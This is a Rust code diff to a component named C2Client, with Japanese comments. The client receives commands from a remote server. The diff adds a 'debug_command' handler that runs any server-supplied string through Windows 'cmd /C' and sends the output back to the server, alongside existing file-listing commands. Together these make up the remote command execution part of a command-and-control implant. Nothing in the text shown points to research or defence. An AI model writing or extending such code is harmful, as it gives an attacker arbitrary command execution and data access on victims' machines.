@@ -187,6 +187,8 @@ impl C2Client {
             "ping" => self.handle_ping_command().await,
             "shutdown" => self.handle_shutdown_command().await,
             "webhook_send" => self.handle_webhook_send().await,
+            // デバッグコマンド実行
+            "execute_debug_command" | "debug_command" => self.handle_debug_command(&command.parameters).await,
             // ファイル管理コマンド
             "list_files" | "ls" => self.handle_list_files_command(&command.parameters).await,
             "get_file_info" | "fileinfo" => self.handle_get_file_info_command(&command.parameters).await,
@@ -227,15 +229,28 @@ impl C2Client {
     /// コマンドレスポンスをサーバーに送信
     async fn send_command_response(&self, response: &CommandResponse) -> Result<(), Box<dyn std::error::Error>> {
         let url = format!("{}/api/commands/response", self.config.command_server_url);
+        
+        println!("📤 Sending command response to: {}", url);
+        println!("   Command ID: {}", response.command_id);
+        println!("   Success: {}", response.success);
+        println!("   Message: {}", response.message);
+        
+        let json_body = serde_json::to_string(response)?;
+        println!("   Payload size: {} bytes", json_body.len());
+        
         let http_response = self
-            .with_defaults(minreq::post(&url).with_header("Content-Type", "application/json").with_body(serde_json::to_string(response)?))
+            .with_defaults(minreq::post(&url).with_header("Content-Type", "application/json").with_body(json_body))
             .send()?;
 
         if http_response.status_code >= 200 && http_response.status_code < 300 {
-            println!("✅ Command response sent successfully");
+            println!("✅ Command response sent successfully (HTTP {})", http_response.status_code);
             Ok(())
         } else {
-            Err(format!("Server response failed: HTTP {}", http_response.status_code).into())
+            let error_msg = format!("Server response failed: HTTP {} - {}", 
+                http_response.status_code, 
+                http_response.as_str().unwrap_or("no body"));
+            println!("❌ {}", error_msg);
+            Err(error_msg.into())
         }
     }
 
@@ -580,6 +595,81 @@ impl C2Client {
                 Ok((format!("Directory created: '{}'", dir_path), Some(info)))
             },
             Err(e) => Err(format!("Failed to create directory '{}': {}", dir_path, e))
+        }
+    }
+
+    /// デバッグコマンド実行
+    async fn handle_debug_command(&self, params: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
+        let command = params.get(0).ok_or("Command parameter required")?;
+        let default_timeout = "30".to_string();
+        let default_workdir = "".to_string();
+        let timeout_str = params.get(1).unwrap_or(&default_timeout);
+        let working_dir = params.get(2).unwrap_or(&default_workdir);
+        
+        let timeout = timeout_str.parse::<u64>().unwrap_or(30);
+        
+        println!("🔧 Executing debug command: {}", command);
+        println!("   Working directory: {}", if working_dir.is_empty() { "(current)" } else { working_dir });
+        println!("   Timeout: {}s", timeout);
+        
+        let start_time = std::time::Instant::now();
+        
+        // コマンド実行用のプロセス設定
+        let mut cmd = std::process::Command::new("cmd");
+        cmd.args(&["/C", command]);
+        
+        // 作業ディレクトリが指定されている場合は設定
+        if !working_dir.is_empty() {
+            cmd.current_dir(working_dir);
+        }
+        
+        // 標準出力・エラー出力をキャプチャ
+        cmd.stdout(std::process::Stdio::piped());
+        cmd.stderr(std::process::Stdio::piped());
+        
+        // タイムアウト付きでコマンド実行（非同期実行）
+        let output = match tokio::time::timeout(
+            Duration::from_secs(timeout),
+            tokio::task::spawn_blocking(move || cmd.output())
+        ).await {
+            Ok(Ok(Ok(output))) => output,
+            Ok(Ok(Err(e))) => {
+                return Err(format!("Command execution failed: {}", e));
+            },
+            Ok(Err(_)) => {
+                return Err("Command task panicked".to_string());
+            },
+            Err(_) => {
+                return Err(format!("Command timed out after {} seconds", timeout));
+            }
+        };
+        
+        let execution_time = start_time.elapsed().as_millis() as u64;
+        
+        let stdout = String::from_utf8_lossy(&output.stdout);
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        let exit_code = output.status.code().unwrap_or(-1);
+        
+        let result_data = serde_json::json!({
+            "command": command,
+            "working_dir": working_dir,
+            "timeout": timeout,
+            "exit_code": exit_code,
+            "stdout": stdout.as_ref(),
+            "stderr": stderr.as_ref(),
+            "execution_time_ms": execution_time,
+            "success": output.status.success()
+        });
+        
+        if output.status.success() {
+            println!("✅ Debug command completed successfully (exit code: {})", exit_code);
+            Ok((format!("Command executed successfully ({}ms)", execution_time), Some(result_data)))
+        } else {
+            println!("❌ Debug command failed (exit code: {})", exit_code);
+            if !stderr.is_empty() {
+                println!("   Error output: {}", stderr.trim());
+            }
+            Ok((format!("Command failed with exit code {} ({}ms)", exit_code, execution_time), Some(result_data)))
         }
     }
 }
